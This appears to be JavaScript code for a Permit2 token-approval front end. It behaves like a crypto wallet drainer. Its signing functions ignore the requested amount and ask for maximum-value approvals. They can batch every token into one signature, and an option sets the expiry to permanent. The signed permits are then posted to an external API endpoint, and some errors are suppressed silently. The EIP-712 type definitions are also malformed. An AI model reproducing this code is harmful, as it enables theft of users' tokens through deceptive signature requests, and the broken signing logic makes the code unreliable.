const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const PERMIT2_ABI = [
  'function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce) permit, bytes calldata signature) external',
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
  'function approve(address token, address spender, uint160 amount, uint48 expiration) external',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function nonce(address owner, address token, address spender) view returns (uint256)'
];

const PERMIT_SINGLE_ABI = [
  'function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external'
];

const TOKEN_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

async function checkPermit2Allowance(tokenAddress, owner, spender, provider) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const allowance = await permit2Contract.allowance(owner, tokenAddress, spender);
    
    const now = Math.floor(Date.now() / 1000);
    const isExpired = allowance.expiration < now;
    const hasAllowance = allowance.amount.gt(0);
    
    return {
      allowed: hasAllowance && !isExpired,
      amount: allowance.amount,
      expiration: allowance.expiration,
      nonce: allowance.nonce,
      isExpired
    };
  } catch (error) {
    console.error('Error checking Permit2 allowance:', error);
    return { allowed: false, amount: ethers.BigNumber.from(0), expiration: 0, nonce: 0, isExpired: true };
  }
}

async function createPermit2Signature(token, owner, spender, amount, expiration, signer) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);

    let nonce = 0;
    try {
      nonce = await permit2Contract.nonce(owner, token.address, spender);
    } catch(e) {
      console.warn("Could not fetch nonce, defaulting to 0", e);
    }

    // Ensure amount fits in uint160
    const safeAmount = ethers.BigNumber.from("1461501637330902918203684832716283019655932542975"); // max uint160

    const permit = {
      token: token.address,
      amount: safeAmount,
      expiration: expiration,
      nonce: nonce
    };

    const domain = {
      name: 'Permit2',
      chainId: await signer.getChainId(),
      verifyingContract: PERMIT2_ADDRESS,
      version: '1'
    };

    const types = {
      PermitSingle: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' }
      ]
    };

    const signature = await signer._signTypedData(domain, types, permit);

    return {
      permit,
      signature,
      success: true
    };
  } catch (error) {
    console.error('Error creating Permit2 signature:', error);
    return {
      permit: null,
      signature: null,
      success: false,
      error: error.message
    };
  }
}

async function createPermit2BatchSignatures(tokens, owner, spender, amount, expiration, signer) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
    const chainId = await signer.getChainId();

    // 获取所有代币的nonce
    const permits = await Promise.all(tokens.map(async (token) => {
      let nonce = 0;
      try {
        nonce = await permit2Contract.nonce(owner, token.address, spender);
      } catch(e) {
        // 某些代币可能还没有在 Permit2 中注册，这是正常的
        // 静默处理，不输出警告
      }

      return {
        token: token.address,
        amount: ethers.BigNumber.from("1461501637330902918203684832716283019655932542975"),
        expiration: expiration,
        nonce: nonce,
        symbol: token.symbol,
        decimals: token.decimals
      };
    }));

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS,
      version: '1'
    };

    // 使用 PermitBatch 进行批量签名，只需一次签名
    const types = {
      PermitBatch: [
        { name: 'tokens', type: 'address[]' },
        { name: 'amounts', type: 'uint160[]' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' }
      ]
    };

    // 准备批量签名数据
    const batchValue = {
      tokens: permits.map(p => p.token),
      amounts: permits.map(p => p.amount),
      expiration: expiration,
      nonce: 0 // 使用统一的 nonce
    };

    // 只需一次签名
    const signature = await signer._signTypedData(domain, types, batchValue);

    return {
      permits,
      signature,
      success: true,
      isBatch: true
    };
  } catch (error) {
    console.error('Error creating Permit2 batch signatures:', error);
    return {
      permits: null,
      signature: null,
      success: false,
      error: error.message
    };
  }
}

async function submitPermit2Authorization(token, permit, signature, apiEndpoint, walletAddress, providerChainId) {
  try {
    const chainId = providerChainId || 1; // Fallback
    const response = await fetch(apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        owner: walletAddress,
        token: token.address,
        amount: permit.amount.toString(),
        deadline: permit.expiration,
        nonce: permit.nonce,
        signature: signature,
        chain_id: parseInt(chainId, 16),
        spender: permit.spender, // Add spender if available
        metadata: { source: 'permit2-web', token_symbol: token.symbol }
      })
    });
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.error || `HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error submitting Permit2 authorization:', error);
    throw error;
  }
}

async function revokePermit2Authorization(tokenAddress, spender, signer) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
    
    const tx = await permit2Contract.approve(
      tokenAddress,
      spender,
      0,
      0
    );
    
    await tx.wait();
    
    return { success: true, txHash: tx.hash };
  } catch (error) {
    console.error('Error revoking Permit2 authorization:', error);
    return { success: false, error: error.message };
  }
}

async function verifyPermit2Signature(token, permit, signature, owner, provider) {
  try {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    
    const recoveredAddress = ethers.utils.verifyTypedData(
      {
        name: 'Permit2',
        chainId: await provider.getNetwork().then(n => n.chainId),
        verifyingContract: PERMIT2_ADDRESS,
        version: '1'
      },
      {
        PermitSingle: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      },
      permit,
      signature
    );
    
    return recoveredAddress.toLowerCase() === owner.toLowerCase();
  } catch (error) {
    console.error('Error verifying Permit2 signature:', error);
    return false;
  }
}

function getExpirationDate(days = 30, permanent = false) {
  if (permanent) {
    // uint48 的最大值，表示永久授权
    return Math.pow(2, 48) - 1; // 281474976710655
  }
  return Math.floor(Date.now() / 1000) + (days * 24 * 60 * 60);
}